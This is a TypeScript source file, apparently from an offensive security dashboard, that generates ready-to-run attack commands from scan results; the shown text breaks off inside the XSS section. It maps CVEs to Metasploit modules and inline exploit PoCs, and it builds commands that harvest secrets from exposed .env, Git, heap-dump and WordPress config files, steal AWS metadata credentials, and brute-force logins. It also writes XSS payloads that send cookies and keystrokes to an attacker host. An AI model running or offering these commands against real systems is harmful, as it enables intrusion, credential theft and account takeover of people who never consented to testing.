import type React from 'react'
import { Zap, Terminal, Key, Shield, AlertTriangle, Globe, Server, Code2 } from 'lucide-react'
import type { ScanResult, WeaponizationItem, WeaponStatus, AttackerConfig, AttackChain } from '../../types'

// ג”€ג”€ Constants ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

type Severity = WeaponizationItem['severity']
const VALID_SEVERITIES: readonly Severity[] = ['critical', 'high', 'medium', 'low', 'info']
function toSeverity(s: string | undefined): Severity {
  return (s && (VALID_SEVERITIES as readonly string[]).includes(s)) ? s as Severity : 'info'
}

export const SEV_ORDER: Record<string, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }
export const SEV_COLORS: Record<string, string> = {
  critical: '#ef4444', high: '#f97316', medium: '#eab308', low: '#22c55e', info: '#3b82f6',
}
export const EXPLOIT_SCORE: Record<string, number> = {
  rce: 10, ssti: 9, deserialize: 9, sqli: 9,
  ssrf: 8, lfi: 8, 'auth-bypass': 8,
  'credential-harvest': 7, xxe: 7, 'post-exploit': 7,
  idor: 6, xss: 6, jwt: 6, cloud: 6, 'supply-chain': 6,
  'api-abuse': 5, takeover: 5, network: 5, oauth: 5, 'brute-force': 5,
  crlf: 4, 'open-redirect': 4, 'prototype-pollution': 4, 'business-logic': 4, 'waf-bypass': 3,
}
export const STATUS_CFG: Record<WeaponStatus, { label: string; color: string; bg: string }> = {
  untested:       { label: 'Untested',       color: 'var(--text-secondary)', bg: 'rgba(255,255,255,0.05)' },
  testing:        { label: 'Testing',         color: '#eab308',              bg: 'rgba(234,179,8,0.12)' },
  confirmed:      { label: 'Confirmed',       color: '#22c55e',              bg: 'rgba(34,197,94,0.12)' },
  'not-vulnerable': { label: 'Not Vuln',      color: 'var(--text-secondary)', bg: 'rgba(255,255,255,0.05)' },
  reported:       { label: 'Reported',        color: '#a78bfa',              bg: 'rgba(167,139,250,0.12)' },
}
export const STATUS_CYCLE: WeaponStatus[] = ['untested', 'testing', 'confirmed', 'not-vulnerable', 'reported']

export const CAT_LABELS: Record<string, string> = {
  rce: 'RCE', sqli: 'SQL Injection', xss: 'XSS', ssrf: 'SSRF',
  lfi: 'LFI', idor: 'IDOR', crlf: 'CRLF', 'open-redirect': 'Open Redirect',
  takeover: 'Subdomain Takeover', network: 'Network', 'credential-harvest': 'Credentials',
  'auth-bypass': 'Auth Bypass', 'brute-force': 'Brute Force', 'post-exploit': 'Post-Exploit',
  'api-abuse': 'API Abuse', 'waf-bypass': 'WAF Bypass',
  ssti: 'SSTI', xxe: 'XXE', deserialize: 'Deserialization', jwt: 'JWT',
  oauth: 'OAuth', 'prototype-pollution': 'Prototype Pollution',
  'supply-chain': 'Supply Chain', cloud: 'Cloud', 'business-logic': 'Business Logic',
}
export const CAT_ICONS: Record<string, React.ElementType> = {
  rce: Zap, sqli: Code2, xss: AlertTriangle, ssrf: Globe, lfi: Server,
  idor: Shield, crlf: Code2, 'open-redirect': Globe, takeover: Globe,
  network: Server, 'credential-harvest': Key, 'auth-bypass': Shield,
  'brute-force': Shield, 'post-exploit': Terminal,
  'api-abuse': Code2, 'waf-bypass': Shield, ssti: Zap, xxe: Code2,
  deserialize: Zap, jwt: Key, oauth: Key, 'prototype-pollution': Code2,
  'supply-chain': AlertTriangle, cloud: Globe, 'business-logic': Shield,
}

// ג”€ג”€ Attacker config substitution ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export function applyAttackerConfig(command: string, cfg: AttackerConfig): string {
  if (!command) return command
  let out = command
  if (cfg.lhost)        out = out.replace(/LHOST|ATTACKER_IP|YOUR_IP/g, cfg.lhost)
  if (cfg.lport)        out = out.replace(/LPORT|4444|ATTACKER_PORT/g, cfg.lport)
  if (cfg.c2domain)     out = out.replace(/C2_DOMAIN|attacker\.com/g, cfg.c2domain)
  if (cfg.interactshUrl) out = out.replace(/INTERACTSH_URL|oast\.fun/g, cfg.interactshUrl)
  if (cfg.sessionCookie) out = out.replace(/YOUR_SESSION|SESSION_COOKIE/g, cfg.sessionCookie)
  return out
}

// ג”€ג”€ CVE ג†’ exploit mapping ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

const CVE_EXPLOITS: Record<string, { msf?: string; poc?: string; tool: string; cvss: string }> = {
  'CVE-2021-3129':  { msf: 'exploit/multi/http/laravel_token_unserialize_exec',         tool: 'metasploit', cvss: '9.8' },
  'CVE-2018-7600':  { msf: 'exploit/unix/webapp/drupal_drupalgeddon2',                   tool: 'metasploit', cvss: '9.8' },
  'CVE-2018-7602':  { msf: 'exploit/unix/webapp/drupal_drupalgeddon2',                   tool: 'metasploit', cvss: '8.1' },
  'CVE-2017-0144':  { msf: 'exploit/windows/smb/ms17_010_eternalblue',                  tool: 'metasploit', cvss: '9.3' },
  'CVE-2019-11043': { msf: 'exploit/multi/http/php_fpm_path_info',                       tool: 'metasploit', cvss: '9.8' },
  'CVE-2021-41773': { msf: 'exploit/multi/http/apache_normalize_path_rce',               tool: 'metasploit', cvss: '9.8' },
  'CVE-2021-42013': { msf: 'exploit/multi/http/apache_normalize_path_rce',               tool: 'metasploit', cvss: '9.8' },
  'CVE-2022-22965': { msf: 'exploit/multi/http/spring4shell',                            tool: 'metasploit', cvss: '9.8' },
  'CVE-2022-22947': { poc: `curl -X POST https://TARGET/actuator/gateway/routes/pwn -H 'Content-Type: application/json' -d '{"id":"pwn","uri":"https://evil.com","predicates":[{"name":"Path","args":{"pattern":"/pwn"}}],"filters":[{"name":"AddResponseHeader","args":{"name":"r","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"})}"}}]}'`, tool: 'curl', cvss: '10.0' },
  'CVE-2021-26855': { msf: 'exploit/windows/http/exchange_proxylogon_rce',               tool: 'metasploit', cvss: '9.8' },
  'CVE-2021-34473': { msf: 'exploit/windows/http/exchange_proxyshell_rce',               tool: 'metasploit', cvss: '9.8' },
  'CVE-2021-44228': { msf: 'exploit/multi/misc/log4shell_header_injection',              tool: 'metasploit', cvss: '10.0' },
  'log4shell':      { msf: 'exploit/multi/misc/log4shell_header_injection',              tool: 'metasploit', cvss: '10.0' },
  'CVE-2023-46604': { msf: 'exploit/multi/misc/apache_activemq_rce_cve_2023_46604',     tool: 'metasploit', cvss: '10.0' },
  'CVE-2024-1709':  { poc: 'python3 exploit.py --url https://TARGET # ConnectWise ScreenConnect Auth Bypass', tool: 'searchsploit', cvss: '10.0' },
  'CVE-2023-4966':  { poc: 'python3 bleed.py --url https://TARGET # Citrix Bleed session token leak', tool: 'searchsploit', cvss: '9.4' },
  'CVE-2023-22515': { poc: `curl -X POST 'https://TARGET/setup/setupadministrator.action' -d 'username=admin&password=admin&confirm=admin&setup-next-button=Next'`, tool: 'curl', cvss: '10.0' },
  'CVE-2024-21762': { poc: 'python3 fortigate_rce.py --target https://TARGET --lhost LHOST --lport LPORT', tool: 'searchsploit', cvss: '9.8' },
  'CVE-2017-7269':  { msf: 'exploit/windows/iis/iis_webdav_scstoragepathfromurl', tool: 'metasploit', cvss: '10.0' },
  'CVE-2011-2523':  { poc: `# vsftpd 2.3.4 backdoor ג€” trigger by logging in with user ending in :)\nnc TARGET 21\nUSER backdoor:)\nPASS any\n# Then connect to backdoor shell:\nnc TARGET 6200`, tool: 'nc', cvss: '10.0' },
  'CVE-2019-12815': { poc: `# ProFTPD mod_copy unauthenticated file copy:\nnc TARGET 21\nSITE CPFR /etc/passwd\nSITE CPTO /var/www/html/passwd.txt\ncurl http://TARGET/passwd.txt`, tool: 'nc', cvss: '9.8' },
}

// ג”€ג”€ Version string ג†’ CVE mapping ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

const VERSION_CVE: Array<{ pattern: RegExp; cve: string; note: string }> = [
  { pattern: /Apache\/2\.4\.49/i,                    cve: 'CVE-2021-41773', note: 'Apache 2.4.49 path traversal + RCE' },
  { pattern: /Apache\/2\.4\.50/i,                    cve: 'CVE-2021-42013', note: 'Apache 2.4.50 path traversal + RCE' },
  { pattern: /PHP\/(5\.[456]\.\d+|7\.[012]\.\d+)/i,  cve: 'CVE-2019-11043', note: 'PHP-FPM nginx path_info RCE' },
  { pattern: /Microsoft-IIS\/6\./i,                  cve: 'CVE-2017-7269',  note: 'IIS 6.0 WebDAV buffer overflow RCE' },
  { pattern: /log4j|log4shell/i,                     cve: 'CVE-2021-44228', note: 'Log4Shell JNDI injection RCE' },
  { pattern: /ActiveMQ\/5\.(1[0-5]|[0-9])\.\d/i,    cve: 'CVE-2023-46604', note: 'Apache ActiveMQ ClassInfo RCE' },
  { pattern: /vsftpd 2\.3\.4/i,                      cve: 'CVE-2011-2523',  note: 'vsftpd 2.3.4 backdoor' },
  { pattern: /ProFTPD\/1\.3\.[56]/i,                 cve: 'CVE-2019-12815', note: 'ProFTPD mod_copy unauthenticated copy' },
  { pattern: /Confluence\/(7\.\d+|8\.[0-3])\./i,    cve: 'CVE-2023-22515', note: 'Confluence admin account creation' },
]

// ג”€ג”€ Multi-signal vuln matcher ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

function matchVuln(vuln: { id?: string; name: string; tags?: string[] }, ...checks: Array<{ id?: string; name?: string; tag?: string }>): boolean {
  const vid = (vuln.id || '').toLowerCase()
  const n = vuln.name.toLowerCase()
  const tags = vuln.tags || []
  return checks.some(c => {
    if (c.id && (vid === c.id || vid.includes(c.id))) return true
    if (c.name && n.includes(c.name)) return true
    if (c.tag && tags.includes(c.tag)) return true
    return false
  })
}

// ג”€ג”€ Parameter-aware payload URL builder ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

function buildPayloadUrl(url: string, param: string, payload: string): string {
  try { const u = new URL(url); u.searchParams.set(param, payload); return u.toString() }
  catch { return `${url}?${param}=${encodeURIComponent(payload)}` }
}

// ג”€ג”€ WeaponId lookup from items array ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

function findWeaponId(items: WeaponizationItem[], ...hints: Array<{ category?: string; name?: string }>): string {
  for (const hint of hints) {
    const found = items.find(i =>
      (hint.category ? i.category === hint.category : true) &&
      (hint.name ? i.vulnName.toLowerCase().includes(hint.name.toLowerCase()) : true)
    )
    if (found) return found.id
  }
  return ''
}

// ג”€ג”€ generateWeaponization ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€

export function generateWeaponization(scan: ScanResult): WeaponizationItem[] {
  const items: WeaponizationItem[] = []
  const idSeen = new Set<string>()
  const cvePushedHosts = new Set<string>()
  const host = scan.target
  const allTech = new Set<string>()
  for (const h of scan.http) for (const t of h.tech || []) allTech.add(t.toLowerCase())
  const hasWaf = scan.http.some(h => !!h.waf)
  const openPorts = scan.ports.filter(p => p.state === 'open')

  const push = (item: WeaponizationItem) => {
    if (idSeen.has(item.id)) return
    idSeen.add(item.id)
    // Contextual severity adjustment
    let adj = item.severity
    let reason = ''
    if (hasWaf && (item.category === 'sqli' || item.category === 'xss')) {
      const sevIdx = SEV_ORDER[adj] ?? 4
      if (sevIdx < 3) { adj = (['critical','high','medium','low','info'] as const)[Math.min(sevIdx + 1, 4)]; reason = 'WAF present ג€” reduced exploitability' }
    }
    if (item.category === 'rce' && openPorts.length > 5) { adj = 'critical'; reason = 'RCE + many open ports = high lateral movement potential' }
    if (adj !== item.severity) { item.adjustedSeverity = adj; item.adjustedReason = reason }
    items.push(item)
  }

  // ג”€ג”€ VULNERABILITIES ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const vuln of scan.vulnerabilities) {
    const vh = vuln.host || host
    const vid = (vuln.id || '').toLowerCase()

    // CVE-based weapon (nuclei template IDs, highest priority)
    const cveKey = Object.keys(CVE_EXPLOITS).find(k => vid.includes(k.toLowerCase()) || vuln.name.toLowerCase().includes(k.toLowerCase()))
    if (cveKey) {
      const ex = CVE_EXPLOITS[cveKey]
      const cmd = ex.msf
        ? `# Metasploit module:\nmsfconsole -q -x "use ${ex.msf}; set RHOSTS ${vh}; set LHOST LHOST; set LPORT LPORT; run"\n\n# SearchSploit:\nsearchsploit ${cveKey}\n\n# Manual PoC:\ncurl -s https://github.com/search?q=${cveKey}&type=repositories`
        : (ex.poc || '').replace(/TARGET/g, vh)
      push({ id:`cve-${vuln.id}`, vulnName:vuln.name, host:vh, severity:vuln.severity, category:'rce', tool:ex.tool, cve:cveKey,
        command: cmd,
        description:`${vuln.description || vuln.name} (CVSS ${ex.cvss})`,
        warning: parseFloat(ex.cvss) >= 9.0 ? `CVSS ${ex.cvss} ג€” weaponized exploits exist, patch immediately` : undefined })
      cvePushedHosts.add(vh)
    }

    // Tag + id + name multi-signal matching
    if (matchVuln(vuln, {id:'env-exposed'},{id:'env-local'},{id:'env-prod'},{id:'env-backup'},{name:'.env'},{name:'environment file'},{tag:'credential'}))
      push({ id:`cred-env-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'credential-harvest', tool:'curl',
        command:`# Read the file:\ncurl -s https://${vh}/.env\ncurl -s https://${vh}/.env.local\ncurl -s https://${vh}/.env.production\n\n# Extract credentials:\ncurl -s https://${vh}/.env | grep -iE 'DB_|PASS|SECRET|API_KEY|TOKEN'`,
        description:'Environment file exposed ג€” extract DB credentials, API keys, secrets', warning:'Credentials may grant full DB/cloud access' })
    if (matchVuln(vuln, {id:'git-exposed'},{id:'git-config'},{name:'.git'},{name:'git repository'},{name:'git config'},{tag:'git'}))
      push({ id:`rce-git-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'rce', tool:'git-dumper',
        command:`pip install git-dumper\ngit-dumper https://${vh}/.git ./repo\ncd repo && git log --oneline -30\ngrep -rn "password\\|secret\\|api_key\\|token" .\ngit log --all --full-history -p | grep -iE 'password|secret|api_key' | head -50`,
        description:'Git repo exposed ג€” dump full source code, history, embedded secrets' })
    if (matchVuln(vuln, {id:'spring-actuator'},{id:'spring-env'},{id:'spring-health'},{name:'spring actuator'},{name:'spring boot actuator'},{tag:'spring'}))
      push({ id:`cred-spring-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'high', category:'credential-harvest', tool:'curl',
        command:`curl -s https://${vh}/actuator | python3 -m json.tool\ncurl -s https://${vh}/actuator/env | python3 -m json.tool\ncurl -s https://${vh}/actuator/heapdump -o heap.hprof && strings heap.hprof | grep -iE 'password|token|secret|jdbc'\ncurl -s https://${vh}/actuator/logfile | tail -50`,
        description:'Spring Boot Actuator exposed ג€” dump env vars, heap dump, logs, credentials' })
    if (matchVuln(vuln, {id:'heapdump'},{name:'heap dump'},{name:'heapdump'}))
      push({ id:`cred-heap-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'credential-harvest', tool:'strings',
        command:`curl -s https://${vh}/heapdump -o heap.hprof\nstrings heap.hprof | grep -iE 'password|token|secret|jdbc|api_key' | head -50\n# Deep analysis:\njmap -dump:format=b,file=heap.hprof PID\npython3 -c "import re,sys; [print(m) for m in re.findall(rb'[a-zA-Z0-9_]{8,}=[a-zA-Z0-9+/=]{16,}', open('heap.hprof','rb').read())]"`,
        description:'JVM heap dump accessible ג€” runtime secrets and credentials in memory' })
    if (matchVuln(vuln, {id:'phpmyadmin'},{name:'phpmyadmin'},{tag:'database'}))
      push({ id:`bf-pma-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'high', category:'brute-force', tool:'hydra',
        command:`hydra -l root -P /usr/share/wordlists/rockyou.txt ${vh} http-get /phpmyadmin/\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ${vh} http-post-form '/phpmyadmin/:pma_username=^USER^&pma_password=^PASS^:invalid'\n# Default creds: root/root, root/(blank), admin/admin`,
        description:'phpMyAdmin exposed ג€” brute-force DB admin access' })
    if (matchVuln(vuln, {id:'wp-admin'},{name:'wordpress admin'},{tag:'wordpress'}))
      push({ id:`bf-wp-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'high', category:'brute-force', tool:'wpscan',
        command:`wpscan --url https://${vh} --enumerate u,p,t,cb,dbe --plugins-detection aggressive\nwpscan --url https://${vh} --usernames admin -P /usr/share/wordlists/rockyou.txt\n# Also test XML-RPC multicall brute-force:\nwpscan --url https://${vh} --password-attack xmlrpc-multicall -P /usr/share/wordlists/rockyou.txt`,
        description:'WordPress admin accessible ג€” enumerate users, plugins, brute-force' })
    if (matchVuln(vuln, {id:'wp-config'},{name:'wp-config'},{name:'wordpress config'}))
      push({ id:`cred-wpconfig-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'credential-harvest', tool:'curl',
        command:`curl -s https://${vh}/wp-config.php\ncurl -s https://${vh}/wp-config.php.bak\ncurl -s https://${vh}/wp-config.php.old\n# Extract DB creds:\ncurl -s https://${vh}/wp-config.php | grep -E "DB_"`,
        description:'WordPress config with DB credentials accessible' })
    if (matchVuln(vuln, {id:'aws-metadata'},{name:'aws'},{name:'metadata'},{tag:'aws'},{tag:'ssrf'}))
      push({ id:`ssrf-aws-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'ssrf', tool:'curl',
        command:`# IMDSv1 (no token needed):\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# IMDSv2:\nTOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# Use stolen creds:\naws configure --profile stolen\naws s3 ls --profile stolen`,
        description:'AWS EC2 metadata SSRF ג€” steal IAM role credentials', warning:'Full AWS account compromise possible' })
    if (matchVuln(vuln, {id:'swagger'},{id:'api-docs'},{name:'swagger'},{name:'api docs'},{name:'openapi'},{tag:'api'}))
      push({ id:`api-swagger-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'api-abuse', tool:'curl',
        command:`curl -s https://${vh}/swagger.json | python3 -m json.tool\ncurl -s https://${vh}/openapi.json | python3 -m json.tool\n# Extract all endpoints:\ncurl -s https://${vh}/swagger.json | python3 -c "import json,sys; d=json.load(sys.stdin); [print(m.upper(),p) for p,v in d.get('paths',{}).items() for m in v]"\n# Auth bypass ג€” test endpoints without auth header`,
        description:'API docs exposed ג€” enumerate all endpoints and test auth bypass' })
    if (matchVuln(vuln, {id:'graphql'},{name:'graphql'},{tag:'graphql'}))
      push({ id:`api-graphql-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'api-abuse', tool:'curl',
        command:`# Introspection:\ncurl -X POST https://${vh}/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name fields{name}}}}"}' | python3 -m json.tool\n# Field suggestion attacks:\ncurl -X POST https://${vh}/graphql -d '{"query":"{__type(name: \\"User\\"){fields{name}}}"}'\n# Batch query abuse:\ncurl -X POST https://${vh}/graphql -d '[{"query":"{ user(id:1){name email} }"},{"query":"{ user(id:2){name email} }"}]'`,
        description:'GraphQL introspection enabled ג€” map full schema, test auth bypass, batch abuse' })
    if (matchVuln(vuln, {id:'rails-console'},{id:'debug-page'},{name:'console'},{name:'debug endpoint'},{tag:'rce'}))
      push({ id:`rce-console-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'rce', tool:'browser',
        command:`# Rails console:\ncurl https://${vh}/console -d "code=\`id\`"\n# Werkzeug debugger PIN bypass:\npython3 werkzeug_pin.py --host ${vh}\ncurl https://${vh}/console -d "code=__import__('os').popen('id').read()"`,
        description:'Interactive web console ג€” direct RCE', warning:'Full server compromise possible' })
    if (matchVuln(vuln, {id:'crlfuzz-crlf'},{name:'crlf'},{tag:'crlf'}))
      push({ id:`crlf-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'crlf', tool:'curl',
        command:`curl -v "https://${vh}/?x=%0d%0aSet-Cookie:%20sessionid=evil"\ncurl -v "https://${vh}/?x=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"\n# Header injection:\ncurl -v "https://${vh}/?x=%0d%0aX-Forwarded-For:%20127.0.0.1"`,
        description:'CRLF injection ג€” inject HTTP headers, poison caches, set malicious cookies' })
    if (matchVuln(vuln, {name:'redirect'},{name:'open redirect'},{tag:'redirect'}))
      push({ id:`redirect-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'open-redirect', tool:'curl',
        command:`curl -v "https://${vh}/?redirect=https://evil.com"\ncurl -v "https://${vh}/?url=//evil.com"\ncurl -v "https://${vh}/oauth/authorize?redirect_uri=https://evil.com"\n# Bypass filters:\ncurl -v "https://${vh}/?redirect=https://evil.com@${vh}"`,
        description:'Open redirect ג€” OAuth token theft, SSRF chaining' })
    if (matchVuln(vuln, {id:'cors-wildcard'},{name:'cors'},{name:'wildcard'},{tag:'cors'}))
      push({ id:`api-cors-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'api-abuse', tool:'curl',
        command:`curl -H "Origin: https://evil.com" -v https://${vh}/api/user\ncurl -H "Origin: null" -v https://${vh}/api/\n# PoC HTML (host on attacker server):\n# fetch('https://${vh}/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://ATTACKER_IP/?d='+JSON.stringify(d)))`,
        description:'CORS misconfiguration ג€” cross-origin data theft from authenticated users' })
    if (matchVuln(vuln, {id:'docker-compose'},{name:'docker compose'},{name:'dockerfile'},{tag:'docker'}))
      push({ id:`cred-docker-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'high', category:'credential-harvest', tool:'curl',
        command:`curl -s https://${vh}/docker-compose.yml\ncurl -s https://${vh}/Dockerfile\ngrep -iE 'password|secret|api_key|MYSQL_|POSTGRES_|REDIS_|MONGO_' docker-compose.yml`,
        description:'Docker config exposed ג€” extract service credentials' })
    if (matchVuln(vuln, {id:'db-dump'},{id:'db-dump-2'},{name:'sql dump'},{name:'database dump'},{name:'backup'}))
      push({ id:`cred-sqldump-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'critical', category:'credential-harvest', tool:'curl',
        command:`curl -s -O https://${vh}/${vuln.matched?.split('/').pop() || 'dump.sql'}\n# Extract creds from dump:\ngrep -iE 'INSERT INTO.*user|password|hash' *.sql | head -20\nhashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt`,
        description:'Database SQL dump publicly downloadable ג€” full data including credentials' })
    if (matchVuln(vuln, {id:'missing-x-frame-options'},{name:'x-frame-options'},{name:'clickjacking'},{tag:'clickjacking'}))
      push({ id:`clickjack-${vuln.id}`, vulnName:vuln.name, host:vh, severity:'medium', category:'business-logic', tool:'browser',
        command:`# Clickjacking PoC (host on attacker server):\n# <iframe src="https://${vh}/profile/delete" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>\n# <button onclick="void(0)" style="position:absolute;...">Click for prize!</button>`,
        description:'Clickjacking ג€” trick users into performing actions on the target site' })
    if (matchVuln(vuln, {id:'missing-csp'},{name:'content security policy'},{name:'csp'},{tag:'xss'}))
      push({ id:`nocsp-${vuln.id}`, vulnName:`No CSP: ${vh}`, host:vh, severity:'medium', category:'xss', tool:'browser',
        command:`# No CSP means XSS payloads run unrestricted\n# Test inline script execution:\ncurl -s "${vh}" | grep -i 'content-security-policy'\n# Standard XSS payloads work without bypass:\n# <script>fetch('https://ATTACKER_IP/?c='+document.cookie)</script>`,
        description:'No Content-Security-Policy header ג€” XSS attacks execute without restriction' })
  }

  // ג”€ג”€ XSS ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€ג”€
  for (const x of scan.xssResults || []) {
    const baseOrigin = (() => { try { return new URL(x.url).origin } catch { return `https://${host}` } })()
    const httpEntry = scan.http.find(h => x.url.startsWith(h.url) || h.url.startsWith(baseOrigin))
    const csp = httpEntry?.headers?.['content-security-policy']
    const hasStrictCsp = !!csp && !csp.includes("'unsafe-inline'") && !csp.includes('*')

    let cmd = ''
    let desc = ''
    let warning: string | undefined

    if (x.type === 'reflected') {
      desc = `Reflected XSS in "${x.parameter}" ג€” inject into URL, executes in victim's browser`
      if (hasStrictCsp) {
        cmd = `# CSP DETECTED (bypass required): ${csp?.slice(0, 100)}\n\n# 1. Find JSONP endpoint on allowed domain:\ncurl -s "${baseOrigin}/api/jsonp?callback=alert(1)"\n\n# 2. Find script gadget in allowed CDN:\n# <script src=https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js></script>\n# <script>$('${x.parameter}').__proto__...`
        desc += ' ג€” CSP present, bypass needed'
      } else {
        const cookieUrl = buildPayloadUrl(x.url, x.parameter, `<script>fetch('https://ATTACKER_IP/c?d='+document.cookie)</script>`)
        const alertUrl  = buildPayloadUrl(x.url, x.parameter, `<script>alert(document.domain)</script>`)
        cmd = `# Reflected XSS ג€” parameter: ${x.parameter}\n\n# Quick confirm (alert):\n${alertUrl}\n\n# Cookie theft ג€” send victim this URL:\n${cookieUrl}\n\n# Keylogger payload:\n# ${buildPayloadUrl(x.url, x.parameter, `<script>document.onkeypress=e=>fetch('https://ATTACKER_IP/k?k='+e.key)</script>`)}\n\n# BeEF hook:\n# ${buildPayloadUrl(x.url, x.parameter, `<script src=http://ATTACKER_IP:3000/hook.js></script>`)}`
      }
    } else if (x.type === 'dom') {
      desc = `DOM XSS sink in "${x.parameter}" ג€” client-side execution, no server roundtrip`
      cmd = `# DOM XSS ג€” sink: ${x.parameter}\n# Source file: ${x.url}\n\n# Test via URL hash (no server logs):\n# ${baseOrigin}/page#<img src=x onerror=fetch('https://ATTACKER_IP/?c='+document.cookie)>\n\n# Test via query param:\n# ${baseOrigin}/?${x.parameter.split(' ')[0].replace(/[^a-z0-9_-]/gi, '')}=<svg onload=alert(1)>\n\n# DOMPurify bypass attempt:\n# <math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">`
    } else if (x.type === 'stored') {
      desc = `Stored XSS in "${x.parameter}" ג€” executes for ALL visitors including admins`
      warning = 'Stored XSS executes for every visitor ג€” escalates to mass account takeover + admin compromise'
